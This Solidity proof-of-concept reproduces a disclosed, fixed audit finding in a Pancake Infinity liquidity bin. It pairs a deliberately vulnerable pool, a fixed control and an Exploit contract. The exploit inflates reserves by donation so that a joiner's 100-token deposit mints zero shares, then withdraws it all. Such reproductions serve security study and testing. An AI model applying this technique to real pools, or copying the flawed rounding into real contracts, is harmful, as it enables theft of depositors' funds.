// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Pancake Infinity BinPool — OtterSec, finding 46983. Fixed in adf9b04
    (2024-08-26): min share required before donate.
    _updateBin recomputes shares with mulDivRoundDown against reserves that
    a donation inflated. A 100 token deposit into a 1-share bin rounds to
    0 shares. The sole LP then withdraws the deposit. The control refuses a
    zero-share mint and the joiner keeps the 100 tokens.
*/

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory sym) {
        symbol = sym;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BinPool {
    Token public tokenX;
    Token public tokenY;
    uint256 public reserveX;
    uint256 public reserveY;
    uint256 public totalSupply;
    uint256 public lastShares;
    mapping(address => uint256) public sharesOf;

    constructor(Token x, Token y) {
        tokenX = x;
        tokenY = y;
    }

    function _liquidity(uint256 x, uint256 y, uint256 price) internal pure returns (uint256) {
        return (x * price) / 1e18 + y;
    }

    function mulDivRoundDown(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        // @> VULN: division rounds down, so 99 tokens of liquidity over donated reserves mints 0 shares
        return (a * b) / c;
    }

    function getCompositionFeesAmount(uint256 rx, uint256 ry, uint256 ax, uint256 ay, uint256 supply)
        internal
        pure
        returns (uint256 feesAmount, uint256 feeAmountToProtocol)
    {
        if (supply == 0 || rx == 0 || ry == 0) return (0, 0);
        if (ay == 0 && ax > 0) {
            feesAmount = ax / 100;
            if (feesAmount == 0) feesAmount = 1;
            feeAmountToProtocol = 0;
        }
    }

    function _updateBin(uint256 amountsInX, uint256 amountsInY) internal returns (uint256 shares) {
        uint256 price = 1e18;
        uint256 supply = totalSupply;
        (uint256 feesAmount, uint256 feeAmountToProtocol) =
            getCompositionFeesAmount(reserveX, reserveY, amountsInX, amountsInY, supply);
        if (feesAmount != 0) {
            uint256 userLiquidity = _liquidity(amountsInX - feesAmount, amountsInY, price);
            uint256 binLiquidity = _liquidity(reserveX + feesAmount - feeAmountToProtocol, reserveY, price);
            // via IR inlines this call into mulDivRoundDown, which floors the share count to 0
            shares = mulDivRoundDown(userLiquidity, supply, binLiquidity);
        } else if (supply == 0) {
            shares = 1;
        } else {
            shares = _liquidity(amountsInX, amountsInY, price);
        }
        reserveX += amountsInX;
        reserveY += amountsInY;
        totalSupply += shares;
        lastShares = shares;
    }

    function mint(uint256 amountX, uint256 amountY) external returns (uint256 shares) {
        if (amountX > 0) require(tokenX.transferFrom(msg.sender, address(this), amountX), "x");
        if (amountY > 0) require(tokenY.transferFrom(msg.sender, address(this), amountY), "y");
        shares = _updateBin(amountX, amountY);
        sharesOf[msg.sender] += shares;
    }

    function donate(uint256 amountX, uint256 amountY) external {
        if (amountX > 0) require(tokenX.transferFrom(msg.sender, address(this), amountX), "dx");
        if (amountY > 0) require(tokenY.transferFrom(msg.sender, address(this), amountY), "dy");
        reserveX += amountX;
        reserveY += amountY;
    }

    function withdraw() external returns (uint256 xOut, uint256 yOut) {
        require(sharesOf[msg.sender] == totalSupply && totalSupply > 0, "sole");
        xOut = reserveX;
        yOut = reserveY;
        reserveX = 0;
        reserveY = 0;
        totalSupply = 0;
        sharesOf[msg.sender] = 0;
        require(tokenX.transfer(msg.sender, xOut), "wx");
        require(tokenY.transfer(msg.sender, yOut), "wy");
    }
}

contract BinPoolFixed {
    Token public tokenX;
    Token public tokenY;
    uint256 public reserveX;
    uint256 public reserveY;
    uint256 public totalSupply;
    mapping(address => uint256) public sharesOf;

    constructor(Token x, Token y) {
        tokenX = x;
        tokenY = y;
    }

    function _liquidity(uint256 x, uint256 y) internal pure returns (uint256) {
        return x + y;
    }

    function mint(uint256 amountX, uint256 amountY) external returns (uint256 shares) {
        if (totalSupply == 0) {
            shares = 1;
        } else {
            uint256 userLiquidity = _liquidity(amountX, amountY);
            uint256 binLiquidity = _liquidity(reserveX, reserveY);
            shares = (userLiquidity * totalSupply) / binLiquidity;
            if (shares == 0) return 0;
        }
        if (amountX > 0) require(tokenX.transferFrom(msg.sender, address(this), amountX), "x");
        if (amountY > 0) require(tokenY.transferFrom(msg.sender, address(this), amountY), "y");
        reserveX += amountX;
        reserveY += amountY;
        totalSupply += shares;
        sharesOf[msg.sender] += shares;
    }

    function donate(uint256 amountX, uint256 amountY) external {
        if (amountX > 0) require(tokenX.transferFrom(msg.sender, address(this), amountX), "dx");
        if (amountY > 0) require(tokenY.transferFrom(msg.sender, address(this), amountY), "dy");
        reserveX += amountX;
        reserveY += amountY;
    }
}

contract Joiner {
    function approve(Token token, address spender) external {
        token.approve(spender, type(uint256).max);
    }

    function join(BinPool pool, uint256 amountX) external {
        pool.mint(amountX, 0);
    }

    function joinFixed(BinPoolFixed pool, uint256 amountX) external returns (uint256 shares) {
        shares = pool.mint(amountX, 0);
    }
}

contract Exploit {
    uint256 public constant DEPOSIT = 100 ether;
    uint256 public constant DONATION = 1000 ether;

    Token public tokenX;
    Token public tokenY;
    BinPool public pool;
    Joiner public joiner;
    uint256 public taken;

    constructor() {
        tokenX = new Token("X");
        tokenY = new Token("Y");
        pool = new BinPool(tokenX, tokenY);
        joiner = new Joiner();
        tokenX.mint(address(this), 1 ether + DONATION);
        tokenY.mint(address(this), 1 ether + DONATION);
        tokenX.approve(address(pool), type(uint256).max);
        tokenY.approve(address(pool), type(uint256).max);
        pool.mint(1 ether, 1 ether);
        pool.donate(DONATION, DONATION);
        tokenX.mint(address(joiner), DEPOSIT);
        joiner.approve(tokenX, address(pool));
    }

    function run() external {
        uint256 beforeX = tokenX.balanceOf(address(this));
        joiner.join(pool, DEPOSIT);
        uint256 minted = pool.lastShares();
        uint256 victimLeft = tokenX.balanceOf(address(joiner));
        pool.withdraw();
        taken = tokenX.balanceOf(address(this)) - beforeX;
        require(minted == 0, "zero shares");
        require(victimLeft == 0, "victim drained");
        require(taken == 1101 ether, "withdrew deposit");
        require(pool.reserveX() == 0, "bin empty");
    }
}
